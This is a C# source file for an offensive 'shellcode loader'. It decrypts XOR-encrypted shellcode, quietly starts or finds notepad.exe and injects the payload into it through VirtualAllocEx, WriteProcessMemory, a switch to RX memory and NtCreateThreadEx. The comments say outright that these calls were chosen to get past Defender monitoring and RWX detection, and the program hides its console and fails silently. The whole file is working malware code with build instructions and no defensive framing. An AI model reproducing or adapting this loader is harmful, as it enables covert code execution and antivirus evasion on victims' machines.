// Chimera Shellcode Loader
// Injects donut-converted shellcode into notepad.exe
// Compile: csc /target:exe /platform:x86 /out:loader.exe Loader.cs
// Requires: shellcode.bin.enc in same directory (output of build_loader.py)

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace ChimeraLoader
{
    class Program
    {
        // ---------------------------------------------------------------
        // NT API imports — using NtCreateThreadEx to avoid hooked
        // CreateRemoteThread which Defender watches closely
        // ---------------------------------------------------------------
        [DllImport("ntdll.dll")]
        static extern uint NtCreateThreadEx(
            out IntPtr threadHandle,
            uint desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList
        );

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(
            uint processAccess,
            bool inheritHandle,
            int processId
        );

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
        );

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out UIntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        // Memory constants
        const uint PROCESS_ALL_ACCESS  = 0x1F0FFF;
        const uint MEM_COMMIT          = 0x1000;
        const uint MEM_RESERVE         = 0x2000;
        const uint PAGE_READWRITE      = 0x04;
        const uint PAGE_EXECUTE_READ   = 0x20;

        // ---------------------------------------------------------------
        // XOR key for shellcode encryption (change before building)
        // Must match the key used in build_loader.py
        // ---------------------------------------------------------------
        static readonly byte[] XorKey = Encoding.UTF8.GetBytes("ChimeraKey2024!!");

        static byte[] DecryptShellcode(byte[] encrypted)
        {
            byte[] decrypted = new byte[encrypted.Length];
            for (int i = 0; i < encrypted.Length; i++)
                decrypted[i] = (byte)(encrypted[i] ^ XorKey[i % XorKey.Length]);
            return decrypted;
        }

        static int FindNotepad()
        {
            Process[] procs = Process.GetProcessesByName("notepad");
            if (procs.Length > 0)
                return procs[0].Id;

            // No notepad running — start one hidden
            var psi = new ProcessStartInfo("notepad.exe")
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            };
            Process p = Process.Start(psi);
            System.Threading.Thread.Sleep(800); // give it time to init
            return p.Id;
        }

        static void Main(string[] args)
        {
            // Hide our own console window
            IntPtr console = GetConsoleWindow();
            if (console != IntPtr.Zero)
                ShowWindow(console, 0);

            try
            {
                // Load encrypted shellcode from embedded resource or file
                // In production: embed as byte array (see build_loader.py output)
                string shellcodePath = Path.Combine(
                    Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location),
                    "shellcode.bin.enc"
                );

                if (!File.Exists(shellcodePath))
                    return; // fail silently

                byte[] encrypted  = File.ReadAllBytes(shellcodePath);
                byte[] shellcode  = DecryptShellcode(encrypted);

                // Find or spawn notepad
                int targetPid = FindNotepad();
                if (targetPid == 0) return;

                // Open target process
                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
                if (hProcess == IntPtr.Zero) return;

                // Allocate RW memory in target
                IntPtr pRemoteMemory = VirtualAllocEx(
                    hProcess,
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE
                );
                if (pRemoteMemory == IntPtr.Zero) { CloseHandle(hProcess); return; }

                // Write shellcode
                UIntPtr bytesWritten;
                WriteProcessMemory(hProcess, pRemoteMemory, shellcode, (uint)shellcode.Length, out bytesWritten);

                // Flip to RX (write then protect — avoids RWX which is flagged)
                uint oldProtect;
                VirtualProtectEx(
                    hProcess,
                    pRemoteMemory,
                    (UIntPtr)shellcode.Length,
                    PAGE_EXECUTE_READ,
                    out oldProtect
                );

                // Create remote thread via NtCreateThreadEx (less monitored than CreateRemoteThread)
                IntPtr hThread;
                NtCreateThreadEx(
                    out hThread,
                    0x1FFFFF,
                    IntPtr.Zero,
                    hProcess,
                    pRemoteMemory,
                    IntPtr.Zero,
                    false,
                    0, 0, 0,
                    IntPtr.Zero
                );

                CloseHandle(hThread);
                CloseHandle(hProcess);
            }
            catch
            {
                // Fail silently — never crash with an error dialog
            }
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
